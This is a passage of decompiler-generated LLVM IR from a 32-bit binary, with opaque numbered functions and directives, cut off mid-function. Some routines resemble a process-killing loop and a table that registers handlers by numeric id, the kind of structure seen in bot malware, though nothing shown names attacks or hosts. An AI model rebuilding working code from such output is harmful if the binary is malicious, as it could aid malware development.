  uselistorder i32 %v3_10001ff8, { 1, 0, 2 }
  uselistorder i32 %v1_10001fdc, { 1, 0 }
  uselistorder i32 %v1_10001fd8, { 1, 0 }
  uselistorder i32 %v0_10001fc4, { 0, 2, 1 }
  uselistorder i32 %tmp29, { 1, 0 }
  uselistorder i32 %v4_10001f60, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10001eac, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 9, 10, 11, 7, 8, 12, 13, 14, 16, 17, 15, 1, 0 }
  uselistorder i32* %r21.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r20.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg2, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_1000212c, { 1, 0 }
  uselistorder label %dec_label_pc_10002100, { 1, 0 }
  uselistorder label %dec_label_pc_100020f0, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_10001f0c, { 6, 1, 2, 3, 4, 0, 5 }
}

define i32 @function_10002140(i32 %arg1) local_unnamed_addr {
dec_label_pc_10002140:
  store i32 268566528, i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_1001eb9c.62 to i32), i32* @r31, align 4
  %v3_1000215c = load i32, i32* @global_var_1001eb9c.62, align 4
  %v3_10002164 = icmp eq i32 %v3_1000215c, 0
  br i1 %v3_10002164, label %dec_label_pc_1000216c, label %dec_label_pc_10002204

dec_label_pc_1000216c:                            ; preds = %dec_label_pc_10002140
  %v3_1000216c = load i32, i32* @global_var_1001eba0.63, align 4
  store i32 0, i32* @r29, align 4
  store i32 0, i32* @global_var_1001eb9c.62, align 4
  %v3_10002178 = icmp eq i32 %v3_1000216c, 0
  br i1 %v3_10002178, label %dec_label_pc_10002180, label %dec_label_pc_10002220

dec_label_pc_10002180:                            ; preds = %dec_label_pc_1000216c, %dec_label_pc_10002204
  %v0_10002184 = phi i32 [ 0, %dec_label_pc_1000216c ], [ %v0_10002214, %dec_label_pc_10002204 ]
  %v3_10002180 = load i32, i32* @global_var_1001eba4.64, align 4
  store i32 %v0_10002184, i32* @global_var_1001eba0.63, align 4
  %v3_10002188 = icmp eq i32 %v3_10002180, 0
  br i1 %v3_10002188, label %dec_label_pc_10002190, label %dec_label_pc_10002238

dec_label_pc_10002190:                            ; preds = %dec_label_pc_10002180, %dec_label_pc_10002220
  %v0_10002194 = phi i32 [ %v0_10002184, %dec_label_pc_10002180 ], [ %v0_1000222c, %dec_label_pc_10002220 ]
  %v3_10002190 = load i32, i32* @global_var_1001eba8.65, align 4
  store i32 %v0_10002194, i32* @global_var_1001eba4.64, align 4
  %v3_10002198 = icmp eq i32 %v3_10002190, 0
  br i1 %v3_10002198, label %dec_label_pc_100021a0, label %dec_label_pc_10002250

dec_label_pc_100021a0:                            ; preds = %dec_label_pc_10002190, %dec_label_pc_10002238
  %v0_100021a4 = phi i32 [ %v0_10002194, %dec_label_pc_10002190 ], [ %v0_10002244, %dec_label_pc_10002238 ]
  %v3_100021a0 = load i32, i32* @global_var_1001ebac.66, align 4
  store i32 %v0_100021a4, i32* @global_var_1001eba8.65, align 4
  %v3_100021a8 = icmp eq i32 %v3_100021a0, 0
  br i1 %v3_100021a8, label %dec_label_pc_100021b0, label %dec_label_pc_10002268

dec_label_pc_100021b0:                            ; preds = %dec_label_pc_100021a0, %dec_label_pc_10002250
  %v0_100021b4 = phi i32 [ %v0_100021a4, %dec_label_pc_100021a0 ], [ %v0_1000225c, %dec_label_pc_10002250 ]
  %v3_100021b0 = load i32, i32* @global_var_1001ebb0.67, align 4
  store i32 %v0_100021b4, i32* @global_var_1001ebac.66, align 4
  %v3_100021b8 = icmp eq i32 %v3_100021b0, 0
  br i1 %v3_100021b8, label %dec_label_pc_100021c0, label %dec_label_pc_10002280

dec_label_pc_100021c0:                            ; preds = %dec_label_pc_100021b0, %dec_label_pc_10002268
  %v0_100021c4 = phi i32 [ %v0_100021b4, %dec_label_pc_100021b0 ], [ %v0_10002274, %dec_label_pc_10002268 ]
  %v3_100021c0 = load i32, i32* @global_var_1001ebb4.68, align 4
  store i32 %v0_100021c4, i32* @global_var_1001ebb0.67, align 4
  %v3_100021c8 = icmp eq i32 %v3_100021c0, 0
  br i1 %v3_100021c8, label %dec_label_pc_100021d0, label %dec_label_pc_10002298

dec_label_pc_100021d0:                            ; preds = %dec_label_pc_100021c0, %dec_label_pc_10002280
  %v0_100021d4 = phi i32 [ %v0_100021c4, %dec_label_pc_100021c0 ], [ %v0_1000228c, %dec_label_pc_10002280 ]
  %v3_100021d0 = load i32, i32* @global_var_1001ebb8.69, align 4
  store i32 %v0_100021d4, i32* @global_var_1001ebb4.68, align 4
  %v3_100021d8 = icmp eq i32 %v3_100021d0, 0
  br i1 %v3_100021d8, label %dec_label_pc_100021e0, label %dec_label_pc_100022b0

dec_label_pc_100021e0:                            ; preds = %dec_label_pc_100021d0, %dec_label_pc_10002298
  %v0_100021e0 = phi i32 [ %v0_100021d4, %dec_label_pc_100021d0 ], [ %v0_100022a4, %dec_label_pc_10002298 ]
  store i32 %v0_100021e0, i32* @global_var_1001ebb8.69, align 4
  store i32 268444136, i32* @lr, align 4
  %v0_100021e4 = call i32 @function_10008804()
  ret i32 %v0_100021e4

dec_label_pc_10002204:                            ; preds = %dec_label_pc_10002140
  store i32 0, i32* @r29, align 4
  store i32 268444176, i32* @lr, align 4
  %v2_1000220c = call i32 @function_1000b510(i32 %v3_1000215c, i32 9)
  %v3_10002210 = load i32, i32* @global_var_1001eba0.63, align 4
  %v0_10002214 = load i32, i32* @r29, align 4
  store i32 %v0_10002214, i32* @global_var_1001eb9c.62, align 4
  %v3_10002218 = icmp eq i32 %v3_10002210, 0
  br i1 %v3_10002218, label %dec_label_pc_10002180, label %dec_label_pc_10002220

dec_label_pc_10002220:                            ; preds = %dec_label_pc_1000216c, %dec_label_pc_10002204
  store i32 268444200, i32* @lr, align 4
  %v2_10002224 = call i32 @function_1000b510(i32 9, i32 9)
  %v3_10002228 = load i32, i32* @global_var_1001eba4.64, align 4
  %v0_1000222c = load i32, i32* @r29, align 4
  store i32 %v0_1000222c, i32* @global_var_1001eba0.63, align 4
  %v3_10002230 = icmp eq i32 %v3_10002228, 0
  br i1 %v3_10002230, label %dec_label_pc_10002190, label %dec_label_pc_10002238

dec_label_pc_10002238:                            ; preds = %dec_label_pc_10002180, %dec_label_pc_10002220
  store i32 268444224, i32* @lr, align 4
  %v2_1000223c = call i32 @function_1000b510(i32 9, i32 9)
  %v3_10002240 = load i32, i32* @global_var_1001eba8.65, align 4
  %v0_10002244 = load i32, i32* @r29, align 4
  store i32 %v0_10002244, i32* @global_var_1001eba4.64, align 4
  %v3_10002248 = icmp eq i32 %v3_10002240, 0
  br i1 %v3_10002248, label %dec_label_pc_100021a0, label %dec_label_pc_10002250

dec_label_pc_10002250:                            ; preds = %dec_label_pc_10002190, %dec_label_pc_10002238
  store i32 268444248, i32* @lr, align 4
  %v2_10002254 = call i32 @function_1000b510(i32 9, i32 9)
  %v3_10002258 = load i32, i32* @global_var_1001ebac.66, align 4
  %v0_1000225c = load i32, i32* @r29, align 4
  store i32 %v0_1000225c, i32* @global_var_1001eba8.65, align 4
  %v3_10002260 = icmp eq i32 %v3_10002258, 0
  br i1 %v3_10002260, label %dec_label_pc_100021b0, label %dec_label_pc_10002268

dec_label_pc_10002268:                            ; preds = %dec_label_pc_100021a0, %dec_label_pc_10002250
  store i32 268444272, i32* @lr, align 4
  %v2_1000226c = call i32 @function_1000b510(i32 9, i32 9)
  %v3_10002270 = load i32, i32* @global_var_1001ebb0.67, align 4
  %v0_10002274 = load i32, i32* @r29, align 4
  store i32 %v0_10002274, i32* @global_var_1001ebac.66, align 4
  %v3_10002278 = icmp eq i32 %v3_10002270, 0
  br i1 %v3_10002278, label %dec_label_pc_100021c0, label %dec_label_pc_10002280

dec_label_pc_10002280:                            ; preds = %dec_label_pc_100021b0, %dec_label_pc_10002268
  store i32 268444296, i32* @lr, align 4
  %v2_10002284 = call i32 @function_1000b510(i32 9, i32 9)
  %v3_10002288 = load i32, i32* @global_var_1001ebb4.68, align 4
  %v0_1000228c = load i32, i32* @r29, align 4
  store i32 %v0_1000228c, i32* @global_var_1001ebb0.67, align 4
  %v3_10002290 = icmp eq i32 %v3_10002288, 0
  br i1 %v3_10002290, label %dec_label_pc_100021d0, label %dec_label_pc_10002298

dec_label_pc_10002298:                            ; preds = %dec_label_pc_100021c0, %dec_label_pc_10002280
  store i32 268444320, i32* @lr, align 4
  %v2_1000229c = call i32 @function_1000b510(i32 9, i32 9)
  %v3_100022a0 = load i32, i32* @global_var_1001ebb8.69, align 4
  %v0_100022a4 = load i32, i32* @r29, align 4
  store i32 %v0_100022a4, i32* @global_var_1001ebb4.68, align 4
  %v3_100022a8 = icmp eq i32 %v3_100022a0, 0
  br i1 %v3_100022a8, label %dec_label_pc_100021e0, label %dec_label_pc_100022b0

dec_label_pc_100022b0:                            ; preds = %dec_label_pc_100021d0, %dec_label_pc_10002298
  store i32 268444344, i32* @lr, align 4
  %v2_100022b4 = call i32 @function_1000b510(i32 9, i32 9)
  %v0_100022b8 = load i32, i32* @r29, align 4
  store i32 %v0_100022b8, i32* @global_var_1001ebb8.69, align 4
  store i32 268444352, i32* @lr, align 4
  %v0_100022bc = call i32 @function_10008804()
  ret i32 %v0_100022bc

; uselistorder directives
  uselistorder i32 %v0_100022a4, { 1, 0 }
  uselistorder i32 %v0_1000228c, { 1, 0 }
  uselistorder i32 %v0_10002274, { 1, 0 }
  uselistorder i32 %v0_1000225c, { 1, 0 }
  uselistorder i32 %v0_10002244, { 1, 0 }
  uselistorder i32 %v0_1000222c, { 1, 0 }
  uselistorder i32 %v0_10002214, { 1, 0 }
  uselistorder label %dec_label_pc_100022b0, { 1, 0 }
  uselistorder label %dec_label_pc_10002298, { 1, 0 }
  uselistorder label %dec_label_pc_10002280, { 1, 0 }
  uselistorder label %dec_label_pc_10002268, { 1, 0 }
  uselistorder label %dec_label_pc_10002250, { 1, 0 }
  uselistorder label %dec_label_pc_10002238, { 1, 0 }
  uselistorder label %dec_label_pc_10002220, { 1, 0 }
  uselistorder label %dec_label_pc_100021e0, { 1, 0 }
  uselistorder label %dec_label_pc_100021d0, { 1, 0 }
  uselistorder label %dec_label_pc_100021c0, { 1, 0 }
  uselistorder label %dec_label_pc_100021b0, { 1, 0 }
  uselistorder label %dec_label_pc_100021a0, { 1, 0 }
  uselistorder label %dec_label_pc_10002190, { 1, 0 }
  uselistorder label %dec_label_pc_10002180, { 1, 0 }
}

define i32 @function_100022dc(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_100022dc:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %tmp7 = icmp slt i32 %arg1, 1
  br i1 %tmp7, label %dec_label_pc_10002320, label %dec_label_pc_100022f4

dec_label_pc_100022f4:                            ; preds = %dec_label_pc_100022dc
  %v0_100022f4 = load i32, i32* %r4.global-to-local, align 4
  %v1_100022f4 = add i32 %v0_100022f4, 4
  %v2_100022f4 = inttoptr i32 %v1_100022f4 to i8*
  %v3_100022f4 = load i8, i8* %v2_100022f4, align 1
  %v4_100022f4 = zext i8 %v3_100022f4 to i32
  %v4_100022fc = icmp eq i32 %v4_100022f4, %arg3
  br i1 %v4_100022fc, label %dec_label_pc_10002334, label %dec_label_pc_10002318

dec_label_pc_10002308:                            ; preds = %dec_label_pc_10002318
  %v1_10002308 = add i32 %v0_10002308.in, 12
  %v2_10002308 = inttoptr i32 %v1_10002308 to i8*
  %v3_10002308 = load i8, i8* %v2_10002308, align 1
  %v4_10002308 = zext i8 %v3_10002308 to i32
  %v4_10002310 = icmp eq i32 %v4_10002308, %arg3
  br i1 %v4_10002310, label %dec_label_pc_10002334, label %dec_label_pc_10002318

dec_label_pc_10002318:                            ; preds = %dec_label_pc_100022f4, %dec_label_pc_10002308
  %v0_1000231c = phi i32 [ %v1_1000231c, %dec_label_pc_10002308 ], [ %arg1, %dec_label_pc_100022f4 ]
  %v0_10002308.in = phi i32 [ %v0_10002308, %dec_label_pc_10002308 ], [ %v0_100022f4, %dec_label_pc_100022f4 ]
  %v0_10002308 = add i32 %v0_10002308.in, 8
  store i32 %v0_10002308, i32* %r4.global-to-local, align 4
  %v1_1000231c = add i32 %v0_1000231c, -1
  %v2_1000231c = icmp eq i32 %v1_1000231c, 0
  br i1 %v2_1000231c, label %dec_label_pc_10002320, label %dec_label_pc_10002308

dec_label_pc_10002320:                            ; preds = %dec_label_pc_10002318, %dec_label_pc_10002334, %dec_label_pc_100022dc
  ret i32 %arg4

dec_label_pc_10002334:                            ; preds = %dec_label_pc_10002308, %dec_label_pc_100022f4
  %v0_10002334 = phi i32 [ %v0_100022f4, %dec_label_pc_100022f4 ], [ %v0_10002308, %dec_label_pc_10002308 ]
  %v1_10002334 = inttoptr i32 %v0_10002334 to i32*
  %v2_10002334 = load i32, i32* %v1_10002334, align 4
  %v3_10002338 = icmp eq i32 %v2_10002334, 0
  br i1 %v3_10002338, label %dec_label_pc_10002320, label %dec_label_pc_10002340

dec_label_pc_10002340:                            ; preds = %dec_label_pc_10002334
  store i32 268444484, i32* @lr, align 4
  %v1_10002340 = call i32 @function_1000bf20(i32 %v2_10002334)
  ret i32 %v1_10002340

; uselistorder directives
  uselistorder i32 %v1_1000231c, { 1, 0 }
  uselistorder i32 %v0_10002308, { 1, 0, 2 }
  uselistorder i32 %v0_10002308.in, { 1, 0 }
  uselistorder i32 %v0_100022f4, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10002320, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10002318, { 1, 0 }
}

define i32 @function_1000235c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000235c:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %tmp7 = icmp slt i32 %arg1, 1
  br i1 %tmp7, label %dec_label_pc_100023a0, label %dec_label_pc_10002374

dec_label_pc_10002374:                            ; preds = %dec_label_pc_1000235c
  %v0_10002374 = load i32, i32* %r4.global-to-local, align 4
  %v1_10002374 = add i32 %v0_10002374, 4
  %v2_10002374 = inttoptr i32 %v1_10002374 to i8*
  %v3_10002374 = load i8, i8* %v2_10002374, align 1
  %v4_10002374 = zext i8 %v3_10002374 to i32
  %v4_1000237c = icmp eq i32 %v4_10002374, %arg3
  br i1 %v4_1000237c, label %dec_label_pc_100023b4, label %dec_label_pc_10002398

dec_label_pc_10002388:                            ; preds = %dec_label_pc_10002398
  %v1_10002388 = add i32 %v0_10002388.in, 12
  %v2_10002388 = inttoptr i32 %v1_10002388 to i8*
  %v3_10002388 = load i8, i8* %v2_10002388, align 1
  %v4_10002388 = zext i8 %v3_10002388 to i32
  %v4_10002390 = icmp eq i32 %v4_10002388, %arg3
  br i1 %v4_10002390, label %dec_label_pc_100023b4, label %dec_label_pc_10002398

dec_label_pc_10002398:                            ; preds = %dec_label_pc_10002374, %dec_label_pc_10002388
  %v0_1000239c = phi i32 [ %v1_1000239c, %dec_label_pc_10002388 ], [ %arg1, %dec_label_pc_10002374 ]
  %v0_10002388.in = phi i32 [ %v0_10002388, %dec_label_pc_10002388 ], [ %v0_10002374, %dec_label_pc_10002374 ]
  %v0_10002388 = add i32 %v0_10002388.in, 8
  store i32 %v0_10002388, i32* %r4.global-to-local, align 4
  %v1_1000239c = add i32 %v0_1000239c, -1
  %v2_1000239c = icmp eq i32 %v1_1000239c, 0
  br i1 %v2_1000239c, label %dec_label_pc_100023a0, label %dec_label_pc_10002388

dec_label_pc_100023a0:                            ; preds = %dec_label_pc_10002398, %dec_label_pc_100023b4, %dec_label_pc_1000235c
  ret i32 %arg4

dec_label_pc_100023b4:                            ; preds = %dec_label_pc_10002388, %dec_label_pc_10002374
  %v0_100023b4 = phi i32 [ %v0_10002374, %dec_label_pc_10002374 ], [ %v0_10002388, %dec_label_pc_10002388 ]
  %v1_100023b4 = inttoptr i32 %v0_100023b4 to i32*
  %v2_100023b4 = load i32, i32* %v1_100023b4, align 4
  store i32 %v2_100023b4, i32* @r3, align 4
  %v3_100023b8 = icmp eq i32 %v2_100023b4, 0
  br i1 %v3_100023b8, label %dec_label_pc_100023a0, label %dec_label_pc_100023c0

dec_label_pc_100023c0:                            ; preds = %dec_label_pc_100023b4
  store i32 10, i32* %r4.global-to-local, align 4
  store i32 268444616, i32* @lr, align 4
  %v2_100023c4 = call i32 @function_1000ac8c(i32 %v2_100023b4, i32 10)
  ret i32 %v2_100023c4

; uselistorder directives
  uselistorder i32 %v1_1000239c, { 1, 0 }
  uselistorder i32 %v0_10002388, { 1, 0, 2 }
  uselistorder i32 %v0_10002388.in, { 1, 0 }
  uselistorder i32 %v0_10002374, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_100023a0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10002398, { 1, 0 }
}

define i32 @function_100023e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_100023e0:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v0_100023e4 = load i32, i32* @lr, align 4
  store i32 %v0_100023e4, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r4.global-to-local, align 4
  %v0_10002400 = load i32, i32* @r28, align 4
  store i32 268444684, i32* @lr, align 4
  %v2_10002408 = call i32 @function_1000c548(i32 1, i32 8)
  %v3_1000240c = load i8, i8* @global_var_1001eb14.58, align 1
  %v4_1000240c = zext i8 %v3_1000240c to i32
  store i32 %v4_1000240c, i32* %r4.global-to-local, align 4
  store i32 %v2_10002408, i32* %r28.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_10002420 = load i32, i32* @global_var_1001eb18.59, align 4
  %v2_10002424 = inttoptr i32 %v2_10002408 to i32*
  store i32 268456360, i32* %v2_10002424, align 4
  %v0_10002428 = load i32, i32* %r4.global-to-local, align 4
  %v1_10002428 = mul i32 %v0_10002428, 4
  store i32 %v1_10002428, i32* %r4.global-to-local, align 4
  %v0_1000242c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000242c = trunc i32 %v0_1000242c to i8
  %v2_1000242c = load i32, i32* %r28.global-to-local, align 4
  %v3_1000242c = add i32 %v2_1000242c, 4
  %v4_1000242c = inttoptr i32 %v3_1000242c to i8*
  store i8 %v1_1000242c, i8* %v4_1000242c, align 1
  %v0_10002430 = load i32, i32* %r4.global-to-local, align 4
  %v1_10002430 = add i32 %v0_10002430, 4
  store i32 %v1_10002430, i32* %r4.global-to-local, align 4
  store i32 268444728, i32* @lr, align 4
  %v3_10002434 = call i32 @function_1000c6b8(i32 %v3_10002420, i32 %v1_10002430, i32 268456360)
  %v3_10002438 = load i8, i8* @global_var_1001eb14.58, align 1
  %v4_10002438 = zext i8 %v3_10002438 to i32
  store i32 %v3_10002434, i32* %r11.global-to-local, align 4
  store i32 8, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_1001eb15.70 to i32), i32* %r0.global-to-local, align 4
  %v1_10002448 = mul nuw nsw i32 %v4_10002438, 4
  %v0_1000244c = load i32, i32* @r28, align 4
  %v3_1000244c = add i32 %v1_10002448, %v3_10002434
  %v4_1000244c = inttoptr i32 %v3_1000244c to i32*
  store i32 %v0_1000244c, i32* %v4_1000244c, align 4
  %v0_10002454 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10002454, i32* @global_var_1001eb18.59, align 4
  %v0_10002458 = load i32, i32* %r0.global-to-local, align 4
  %v1_10002458 = trunc i32 %v0_10002458 to i8
  store i8 %v1_10002458, i8* @global_var_1001eb14.58, align 1
  store i32 268444768, i32* @lr, align 4
  %v2_1000245c = call i32 @function_1000c548(i32 1, i32 8)
  %v3_10002460 = load i8, i8* @global_var_1001eb14.58, align 1
  %v4_10002460 = zext i8 %v3_10002460 to i32
  store i32 %v4_10002460, i32* %r4.global-to-local, align 4
  store i32 %v2_1000245c, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_10002474 = load i32, i32* @global_var_1001eb18.59, align 4
  %v2_10002478 = inttoptr i32 %v2_1000245c to i32*
  store i32 268457604, i32* %v2_10002478, align 4
  %v0_1000247c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000247c = mul i32 %v0_1000247c, 4
  store i32 %v1_1000247c, i32* %r4.global-to-local, align 4
  %v0_10002480 = load i32, i32* %r0.global-to-local, align 4
  %v1_10002480 = trunc i32 %v0_10002480 to i8
  %v2_10002480 = load i32, i32* %r28.global-to-local, align 4
  %v3_10002480 = add i32 %v2_10002480, 4
  %v4_10002480 = inttoptr i32 %v3_10002480 to i8*
  store i8 %v1_10002480, i8* %v4_10002480, align 1
  %v0_10002484 = load i32, i32* %r4.global-to-local, align 4
  %v1_10002484 = add i32 %v0_10002484, 4
  store i32 %v1_10002484, i32* %r4.global-to-local, align 4
  store i32 268444812, i32* @lr, align 4
  %v3_10002488 = call i32 @function_1000c6b8(i32 %v3_10002474, i32 %v1_10002484, i32 268457604)
  %v3_1000248c = load i8, i8* @global_var_1001eb14.58, align 1
  %v4_1000248c = zext i8 %v3_1000248c to i32
  store i32 %v3_10002488, i32* %r11.global-to-local, align 4
  store i32 8, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_1001eb15.70 to i32), i32* %r0.global-to-local, align 4
  %v1_1000249c = mul nuw nsw i32 %v4_1000248c, 4
  %v0_100024a0 = load i32, i32* @r28, align 4
  %v3_100024a0 = add i32 %v1_1000249c, %v3_10002488
  %v4_100024a0 = inttoptr i32 %v3_100024a0 to i32*
  store i32 %v0_100024a0, i32* %v4_100024a0, align 4
  %v0_100024a8 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_100024a8, i32* @global_var_1001eb18.59, align 4
  %v0_100024ac = load i32, i32* %r0.global-to-local, align 4
  %v1_100024ac = trunc i32 %v0_100024ac to i8
  store i8 %v1_100024ac, i8* @global_var_1001eb14.58, align 1
  store i32 268444852, i32* @lr, align 4
  %v2_100024b0 = call i32 @function_1000c548(i32 1, i32 8)
  %v3_100024b4 = load i8, i8* @global_var_1001eb14.58, align 1
  %v4_100024b4 = zext i8 %v3_100024b4 to i32
  store i32 %v4_100024b4, i32* %r4.global-to-local, align 4
  store i32 %v2_100024b0, i32* %r28.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_100024c8 = load i32, i32* @global_var_1001eb18.59, align 4
  %v2_100024cc = inttoptr i32 %v2_100024b0 to i32*
  store i32 268458596, i32* %v2_100024cc, align 4
  %v0_100024d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_100024d0 = mul i32 %v0_100024d0, 4
  store i32 %v1_100024d0, i32* %r4.global-to-local, align 4
  %v0_100024d4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100024d4 = trunc i32 %v0_100024d4 to i8
  %v2_100024d4 = load i32, i32* %r28.global-to-local, align 4
  %v3_100024d4 = add i32 %v2_100024d4, 4
  %v4_100024d4 = inttoptr i32 %v3_100024d4 to i8*
  store i8 %v1_100024d4, i8* %v4_100024d4, align 1
  %v0_100024d8 = load i32, i32* %r4.global-to-local, align 4
  %v1_100024d8 = add i32 %v0_100024d8, 4
  store i32 %v1_100024d8, i32* %r4.global-to-local, align 4
  store i32 268444896, i32* @lr, align 4
  %v3_100024dc = call i32 @function_1000c6b8(i32 %v3_100024c8, i32 %v1_100024d8, i32 268458596)
  %v3_100024e0 = load i8, i8* @global_var_1001eb14.58, align 1
  %v4_100024e0 = zext i8 %v3_100024e0 to i32
  store i32 %v3_100024dc, i32* %r11.global-to-local, align 4
  store i32 8, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_1001eb15.70 to i32), i32* %r0.global-to-local, align 4
  %v1_100024f0 = mul nuw nsw i32 %v4_100024e0, 4
  %v0_100024f4 = load i32, i32* @r28, align 4
  %v3_100024f4 = add i32 %v1_100024f0, %v3_100024dc
  %v4_100024f4 = inttoptr i32 %v3_100024f4 to i32*
  store i32 %v0_100024f4, i32* %v4_100024f4, align 4
  %v0_100024fc = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_100024fc, i32* @global_var_1001eb18.59, align 4
  %v0_10002500 = load i32, i32* %r0.global-to-local, align 4
  %v1_10002500 = trunc i32 %v0_10002500 to i8
  store i8 %v1_10002500, i8* @global_var_1001eb14.58, align 1
  store i32 268444936, i32* @lr, align 4
  %v2_10002504 = call i32 @function_1000c548(i32 1, i32 8)
  %v3_10002508 = load i8, i8* @global_var_1001eb14.58, align 1
  %v4_10002508 = zext i8 %v3_10002508 to i32
  store i32 %v4_10002508, i32* %r4.global-to-local, align 4
  store i32 %v2_10002504, i32* %r28.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v3_1000251c = load i32, i32* @global_var_1001eb18.59, align 4
  %v2_10002520 = inttoptr i32 %v2_10002504 to i32*
  store i32 268454712, i32* %v2_10002520, align 4
  %v0_10002524 = load i32, i32* %r4.global-to-local, align 4
  %v1_10002524 = mul i32 %v0_10002524, 4
  store i32 %v1_10002524, i32* %r4.global-to-local, align 4
  %v0_10002528 = load i32, i32* %r0.global-to-local, align 4
  %v1_10002528 = trunc i32 %v0_10002528 to i8
  %v2_10002528 = load i32, i32* %r28.global-to-local, align 4
  %v3_10002528 = add i32 %v2_10002528, 4
  %v4_10002528 = inttoptr i32 %v3_10002528 to i8*
  store i8 %v1_10002528, i8* %v4_10002528, align 1
  %v0_1000252c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000252c = add i32 %v0_1000252c, 4
  store i32 %v1_1000252c, i32* %r4.global-to-local, align 4
  store i32 268444980, i32* @lr, align 4
  %v3_10002530 = call i32 @function_1000c6b8(i32 %v3_1000251c, i32 %v1_1000252c, i32 268454712)
  %v3_10002534 = load i8, i8* @global_var_1001eb14.58, align 1
  %v4_10002534 = zext i8 %v3_10002534 to i32
  store i32 %v3_10002530, i32* %r11.global-to-local, align 4
  store i32 8, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_1001eb15.70 to i32), i32* %r0.global-to-local, align 4
  %v1_10002544 = mul nuw nsw i32 %v4_10002534, 4
  %v0_10002548 = load i32, i32* @r28, align 4
  %v3_10002548 = add i32 %v1_10002544, %v3_10002530
  %v4_10002548 = inttoptr i32 %v3_10002548 to i32*
  store i32 %v0_10002548, i32* %v4_10002548, align 4
  %v0_10002550 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10002550, i32* @global_var_1001eb18.59, align 4
  %v0_10002554 = load i32, i32* %r0.global-to-local, align 4
  %v1_10002554 = trunc i32 %v0_10002554 to i8
  store i8 %v1_10002554, i8* @global_var_1001eb14.58, align 1
  store i32 268445020, i32* @lr, align 4
  %v2_10002558 = call i32 @function_1000c548(i32 1, i32 8)
  %v3_1000255c = load i8, i8* @global_var_1001eb14.58, align 1
  %v4_1000255c = zext i8 %v3_1000255c to i32
  store i32 %v4_1000255c, i32* %r4.global-to-local, align 4
  store i32 %v2_10002558, i32* %r28.global-to-local, align 4
  store i32 12, i32* %r0.global-to-local, align 4
  %v3_10002570 = load i32, i32* @global_var_1001eb18.59, align 4
  %v2_10002574 = inttoptr i32 %v2_10002558 to i32*
  store i32 268455536, i32* %v2_10002574, align 4
  %v0_10002578 = load i32, i32* %r4.global-to-local, align 4
  %v1_10002578 = mul i32 %v0_10002578, 4
  store i32 %v1_10002578, i32* %r4.global-to-local, align 4
  %v0_1000257c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000257c = trunc i32 %v0_1000257c to i8
  %v2_1000257c = load i32, i32* %r28.global-to-local, align 4
  %v3_1000257c = add i32 %v2_1000257c, 4
  %v4_1000257c = inttoptr i32 %v3_1000257c to i8*
  store i8 %v1_1000257c, i8* %v4_1000257c, align 1
  %v0_10002580 = load i32, i32* %r4.global-to-local, align 4
  %v1_10002580 = add i32 %v0_10002580, 4
  store i32 %v1_10002580, i32* %r4.global-to-local, align 4
  store i32 268445064, i32* @lr, align 4
  %v3_10002584 = call i32 @function_1000c6b8(i32 %v3_10002570, i32 %v1_10002580, i32 268455536)
  %v3_10002588 = load i8, i8* @global_var_1001eb14.58, align 1
  %v4_10002588 = zext i8 %v3_10002588 to i32
  store i32 %v3_10002584, i32* %r11.global-to-local, align 4
  store i32 8, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_1001eb15.70 to i32), i32* %r0.global-to-local, align 4
  %v1_10002598 = mul nuw nsw i32 %v4_10002588, 4
  %v0_1000259c = load i32, i32* @r28, align 4
  %v3_1000259c = add i32 %v1_10002598, %v3_10002584
  %v4_1000259c = inttoptr i32 %v3_1000259c to i32*
  store i32 %v0_1000259c, i32* %v4_1000259c, align 4
  %v0_100025a4 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_100025a4, i32* @global_var_1001eb18.59, align 4
  %v0_100025a8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100025a8 = trunc i32 %v0_100025a8 to i8
  store i8 %v1_100025a8, i8* @global_var_1001eb14.58, align 1
  store i32 268445104, i32* @lr, align 4
